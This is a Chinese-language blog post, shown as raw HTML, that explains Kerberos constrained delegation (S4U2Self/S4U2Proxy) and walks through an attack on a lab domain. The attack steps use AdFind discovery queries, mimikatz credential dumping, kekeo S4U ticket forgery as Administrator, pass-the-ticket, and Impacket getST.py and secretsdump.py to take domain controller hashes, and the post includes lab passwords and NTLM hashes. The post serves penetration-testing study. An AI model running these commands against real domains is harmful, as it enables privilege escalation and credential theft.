@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>约束委派攻击 | 林中小屋</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="约束委派接上述的非约束委派，由于非约束委派的不安全性，微软在windows2003中发布了约束委派的功能。约束委派在Kerberos中User不会直接发送TGT给服务，而是对发送给service1的认证信息做了限制，不允许service1代表User使用这个TGT去访问其他服务。这里包括一组名为S4U2Self（Service for User to  Self）和S4U2Proxy（Servic">
+<meta property="og:type" content="article">
+<meta property="og:title" content="约束委派攻击">
+<meta property="og:url" content="http://antipassion.github.io/2022/01/09/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="林中小屋">
+<meta property="og:description" content="约束委派接上述的非约束委派，由于非约束委派的不安全性，微软在windows2003中发布了约束委派的功能。约束委派在Kerberos中User不会直接发送TGT给服务，而是对发送给service1的认证信息做了限制，不允许service1代表User使用这个TGT去访问其他服务。这里包括一组名为S4U2Self（Service for User to  Self）和S4U2Proxy（Servic">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://antipassion.github.io/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109233827841.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116205432579.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116205616253.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116205819779.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116210212550.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116212912030.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116210849880.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116211127487.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116211348121.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116211749435.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116211914613.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116212122245.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116213302798.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116213633756.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116214205656.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116214345566.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116214439465.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116221830895.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116224843756.png">
+<meta property="article:published_time" content="2022-01-09T15:21:05.000Z">
+<meta property="article:modified_time" content="2022-01-25T13:35:33.902Z">
+<meta property="article:author" content="Nayon">
+<meta property="article:tag" content="域渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://antipassion.github.io/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109233827841.png">
+  
+    <link rel="alternate" href="/atom.xml" title="林中小屋" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">林中小屋</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://AntiPassion.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-约束委派攻击" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/01/09/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/" class="article-date">
+  <time datetime="2022-01-09T15:21:05.000Z" itemprop="datePublished">2022-01-09</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      约束委派攻击
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h2><p>接上述的非约束委派，由于非约束委派的不安全性，微软在windows2003中发布了约束委派的功能。约束委派在Kerberos中User不会直接发送TGT给服务，而是对发送给service1的认证信息做了限制，不允许service1代表User使用这个TGT去访问其他服务。这里包括一组名为S4U2Self（Service for User to  Self）和S4U2Proxy（Service for User to Proxy）的Kerberos协议扩展。</p>
+<p><strong>流程:</strong></p>
+<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109233827841.png" alt="image-20220109233827841"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--more--&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">1.用户向Service1发送请求</span><br><span class="line"></span><br><span class="line">2.这时在官方文档中的介绍是在这一流程开始之前Service1已经通过KRB_AS_REQ得到了用户用来访问Service1的TGT，然后通过S4U2self扩展模拟用户向KDC请求ST。</span><br><span class="line"></span><br><span class="line">3.KDC这时返回给Service1一个用于用户验证Service1的ST（我们称为ST1），并且Service1用这个ST1完成和用户的验证过程。</span><br><span class="line"></span><br><span class="line">4.Service1在步骤3使用模拟用户申请KDC所获得的ST1票据与User进行验证，然后响应用户的请求。</span><br><span class="line"></span><br><span class="line">注:这个过程其实Service1是获得了用户的ST1和TGT的，但是，S4U2Self扩展不允许Service1去代表用户请求其他服务。</span><br><span class="line"></span><br><span class="line">5.用户再次向Service1发起请求，此时Service1需要以用户的身份去访问Service2.此处官方文档提到了两点。</span><br><span class="line"></span><br><span class="line">	A。Service1已经通过验证，并且有一个有效的TGT。</span><br><span class="line"></span><br><span class="line">	B。Service1有从用户到Service1的forwardableST（可转发ST），此处我认为，根据流程来看，可转发ST1其实就是ST1，用于(6)的验证</span><br><span class="line"></span><br><span class="line">6.Service1代表用户向Service2请求一个用于认证Service2的ST(称之为ST2)。用户在ST1中通过cname (client name) 和crealm(client name)进行标示。</span><br><span class="line"></span><br><span class="line">7.KDC接收到(6)中的请求后，对PAC的数字签名进行验证。如果验证成功或这个请求没有PAC（无法验证失败）,KDC将返回ST2给service1,不过这个ST2中的cname crealm标示的是用户而不是service1。</span><br><span class="line"></span><br><span class="line">8.service1代表用户使用ST2请求访问Service2</span><br><span class="line"></span><br><span class="line">9.Service2响应Service1的请求</span><br><span class="line"></span><br><span class="line">10.Service1将Service2的响应转发给User。</span><br></pre></td></tr></table></figure>
+
+<p>在这个过程中，S4U2Self扩展的作用是让Service1代表用户向KDC验证用户的合法性，并且得到一个可转发的ST1。S4U2Proxy的作用可以说是让Service1代表用户身份通过ST1重新获取ST2，并且不允许Service1以用户的身份去访问其他服务。更多的细节可以参考官方的文档，和RFC4120的内容。</p>
+<p>同时注意forwardable字段，有forwardable标记为可转发的是能够通过S4U2Proxy扩展协议进行转发的，如果没有标记则不能进行转发。</p>
+<h4 id="前期准备："><a href="#前期准备：" class="headerlink" title="前期准备："></a><strong>前期准备</strong>：</h4><p>​    域控机为域用户配置SPN，用于域用户配置约束委派</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -U -A SQL/test win2016</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116205432579.png" alt="image-20220116205432579"></p>
+<p>此时在Active Directory 用户和计算机处，可以发现域用户win2016已经可以配置委派了。</p>
+<p>为win2016用户配置约束委派，做win2019机器的cifs服务的委派</p>
+<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116205616253.png" alt="image-20220116205616253"></p>
+<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116205819779.png" alt="image-20220116205819779"></p>
+<p>此时应用设置后，已在域中完成了win2016用户对win2019机器的cifs服务的委派</p>
+<h4 id="发现约束委派"><a href="#发现约束委派" class="headerlink" title="发现约束委派:"></a>发现约束委派:</h4><p>使用Adfind.exe尝试发现约束委派</p>
+<h6 id="查找域中配置约束委派用户"><a href="#查找域中配置约束委派用户" class="headerlink" title="查找域中配置约束委派用户"></a>查找域中配置约束委派用户</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=vulntarget,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116210212550.png" alt="image-20220116210212550"></p>
+<p>发现win2016用户存在约束委派，委派了win2019机器的cifs服务</p>
+<h6 id="在域中查找配置了约束委派主机"><a href="#在域中查找配置了约束委派主机" class="headerlink" title="在域中查找配置了约束委派主机"></a>在域中查找配置了约束委派主机</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=vulntarget,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116212912030.png" alt="image-20220116212912030"></p>
+<p>可以看到主机Win2016存在约束委派，委派了win2019机器的cifs服务</p>
+<h4 id="攻击利用："><a href="#攻击利用：" class="headerlink" title="攻击利用："></a>攻击利用：</h4><h5 id="域用户存在约束委派"><a href="#域用户存在约束委派" class="headerlink" title="域用户存在约束委派:"></a><strong>域用户存在约束委派:</strong></h5><h6 id="kekeo-exe结合存在约束委派的域用户明文密码申请可转发的TGT票据"><a href="#kekeo-exe结合存在约束委派的域用户明文密码申请可转发的TGT票据" class="headerlink" title="kekeo.exe结合存在约束委派的域用户明文密码申请可转发的TGT票据"></a>kekeo.exe结合存在约束委派的域用户明文密码申请可转发的TGT票据</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo # tgt::ask /user:win2016 /domain:vulntarget.com /password:Admin#123</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116210849880.png" alt="image-20220116210849880"></p>
+<h6 id="kekeo-exe结合存在约束委派的域用户的NTLM申请可转发的TGT票据"><a href="#kekeo-exe结合存在约束委派的域用户的NTLM申请可转发的TGT票据" class="headerlink" title="kekeo.exe结合存在约束委派的域用户的NTLM申请可转发的TGT票据"></a>kekeo.exe结合存在约束委派的域用户的NTLM申请可转发的TGT票据</h6><p>利用mimikatz拿到域用户win2016的NTLM hash进行利用</p>
+<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116211127487.png" alt="image-20220116211127487"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo # tgt::ask /user:win2016 /domain:vulntarget.com /NTLM:dfc8d2bfa540a0a6e2248a82322e654e</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116211348121.png" alt="image-20220116211348121"></p>
+<h6 id="利用kekeo进行S4U伪造"><a href="#利用kekeo进行S4U伪造" class="headerlink" title="利用kekeo进行S4U伪造"></a>利用kekeo进行S4U伪造</h6><p>利用拿到的TGT票据通过伪造s4u请求以administrator用户身份请求访问域控机的cifs服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgs::s4u /tgt:TGT_win2016@VULNTARGET.COM_krbtgt~vulntarget.com@VULNTARGET.COM.kirbi /user:Administrator@vulntarget.com /service:cifs/win2019.vulntarget.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116211749435.png" alt="image-20220116211749435"></p>
+<h6 id="PTT利用拿到的TGS票据"><a href="#PTT利用拿到的TGS票据" class="headerlink" title="PTT利用拿到的TGS票据"></a>PTT利用拿到的TGS票据</h6><p>通过mimikatz进行ptt拿到域控机的cifs服务使用权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@vulntarget.com@VULNTARGET.COM_cifs~win2019.vulntarget.com@VULNTARGET.COM.kirbi</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116211914613.png" alt="image-20220116211914613"></p>
+<p>注:此处使用的通过S4U2proxy 拿到的 TGS票据，而不是使用通过S4U2self拿到的TGS票据。</p>
+<p>查看域控机的共享目录成功！</p>
+<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116212122245.png" alt="image-20220116212122245"></p>
+<h5 id="域主机存在约束委派"><a href="#域主机存在约束委派" class="headerlink" title="域主机存在约束委派:"></a>域主机存在约束委派:</h5><p>通过mimikatz拿到域主机win2016的服务账户NTLM hash来申请可转发的TGT票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p>注:需要管理员权限才可拿到密码Hash</p>
+<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116213302798.png" alt="image-20220116213302798"></p>
+<h6 id="kekeo-exe结合存在约束委派的域主机的服务账户的NTLM申请可转发的TGT"><a href="#kekeo-exe结合存在约束委派的域主机的服务账户的NTLM申请可转发的TGT" class="headerlink" title="kekeo.exe结合存在约束委派的域主机的服务账户的NTLM申请可转发的TGT"></a>kekeo.exe结合存在约束委派的域主机的服务账户的NTLM申请可转发的TGT</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:win2016$ /domain:vulntarget.com /NTLM:e0cd419213811fd910ca6c3c42d764e7</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116213633756.png" alt="image-20220116213633756"></p>
+<p>注:带有$符号的用户一般都是服务主机账户，而非普通用户</p>
+<h6 id="通过kekeo进行S4U伪造"><a href="#通过kekeo进行S4U伪造" class="headerlink" title="通过kekeo进行S4U伪造"></a>通过kekeo进行S4U伪造</h6><p>如此，成功拿到了对应委派服务的TGS票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo # tgs::s4u /tgt:TGT_win2016$@VULNTARGET.COM_krbtgt~vulntarget.com@VULNTARGET.COM.kirbi /user:Administrator@vulntarget.com /service:cifs/win2019.vulntarget.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116214205656.png" alt="image-20220116214205656"></p>
+<h6 id="PTT利用拿到的TGS票据-1"><a href="#PTT利用拿到的TGS票据-1" class="headerlink" title="PTT利用拿到的TGS票据"></a>PTT利用拿到的TGS票据</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@vulntarget.com@VULNTARGET.COM_cifs~win2019.vulntarget.com@VULNTARGET.COM.kirbi</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116214345566.png" alt="image-20220116214345566"></p>
+<p>尝试对域控进行共享目录访问,利用成功！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\win2019.vulntarget.com\c$</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116214439465.png" alt="image-20220116214439465"></p>
+<p>注: 此处进行tgs::s4u伪造时，申请的service是cifs/win2019.vulntarget.com时；我们在使用时就应该是dir \win2019.vulntarget.com\c$ 这样才能访问成功，若dir \win2019\c$则会访问失败，反之亦然！</p>
+<h4 id="域外利用"><a href="#域外利用" class="headerlink" title="域外利用"></a>域外利用</h4><h5 id="域外使用adfind发现非约束-约束委派主机或用户时，可使用如下命令"><a href="#域外使用adfind发现非约束-约束委派主机或用户时，可使用如下命令" class="headerlink" title="域外使用adfind发现非约束/约束委派主机或用户时，可使用如下命令:"></a>域外使用adfind发现非约束/约束委派主机或用户时，可使用如下命令:</h5><h6 id="在域外探测存在约束委派的域用户账户"><a href="#在域外探测存在约束委派的域用户账户" class="headerlink" title="在域外探测存在约束委派的域用户账户:"></a>在域外探测存在约束委派的域用户账户:</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -h 10.0.10.110 -u vulntarget\win2019 -up admin#123 -b &quot;DC=vulntarget,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; msDS-AllowedToDelegateTo</span><br></pre></td></tr></table></figure>
+
+<h6 id="在域外探测存在约束委派的域主机"><a href="#在域外探测存在约束委派的域主机" class="headerlink" title="在域外探测存在约束委派的域主机:"></a>在域外探测存在约束委派的域主机:</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -h 10.0.10.110 -u vulntarget\win2019 -up admin#123 -b &quot;DC=vulntarget,DC=com&quot; -f &quot;(&amp;(objectCategory=computer)(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=16777216))&quot; msDS-AllowedToDelegateTo</span><br></pre></td></tr></table></figure>
+
+<h5 id="域外通过getST-py进行约束委派攻击"><a href="#域外通过getST-py进行约束委派攻击" class="headerlink" title="域外通过getST.py进行约束委派攻击"></a><strong>域外通过getST.py进行约束委派攻击</strong></h5><p>(可通过隧道，需提前通过hosts文件绑定ip与主机名)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 getST.py -hashes :b223fae09b86d75482d2c61ac5f773fe -spn cifs/win2019.vulntarget.com -impersonate administrator vulntarget/win2016$ -dc-ip 10.0.10.110</span><br></pre></td></tr></table></figure>
+
+<p>-hashes:  NTLM hash</p>
+<p>-spn: 约束委派指定的服务</p>
+<p>-impersonate 伪造的用户 存在约束委派的域主机名</p>
+<p>-dc-ip: dc地址</p>
+<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116221830895.png" alt="image-20220116221830895"></p>
+<p>拿到administrator.ccache</p>
+<p>利用export加载环境变量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache</span><br></pre></td></tr></table></figure>
+
+<p>注: KPB5CCNAME 变量名不可变</p>
+<h6 id="利用secretsdump-py-拖取hash"><a href="#利用secretsdump-py-拖取hash" class="headerlink" title="利用secretsdump.py 拖取hash"></a>利用secretsdump.py 拖取hash</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py -k -no-pass win2019.vulntarget.com -dc-ip 10.0.10.110</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116224843756.png" alt="image-20220116224843756"></p>
+<p>注: 此处使用的cifs服务进行的攻击，若脚本提示认证失败，最大的可能为我们的利用ST票据与攻击应该使用的ST票据不符。</p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>摸了……..</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://antipassion.github.io/2022/01/09/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/" data-id="ckyu7e9pb0019xgu49vx1bnyh" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2022/01/06/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">非约束委派攻击</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/PE%E7%BB%93%E6%9E%84/">PE结构</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/ctf/">ctf</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/PE%E7%BB%93%E6%9E%84/" rel="tag">PE结构</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/PE%E7%BB%93%E6%9E%84/" style="font-size: 20px;">PE结构</a> <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 15px;">域渗透</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">一月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">十一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">十月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">九月 2021</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/01/09/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/">约束委派攻击</a>
+          </li>
+        
+          <li>
+            <a href="/2022/01/06/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/">非约束委派攻击</a>
+          </li>
+        
+          <li>
+            <a href="/2021/11/19/PE%E7%BB%93%E6%9E%84-DOS%E5%A4%B4/">PE结构-DOS头</a>
+          </li>
+        
+          <li>
+            <a href="/2021/11/16/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81/">PE结构-PE文件的两种状态</a>
+          </li>
+        
+          <li>
+            <a href="/2021/11/12/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/">SSTI模板注入学习</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 Nayon<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
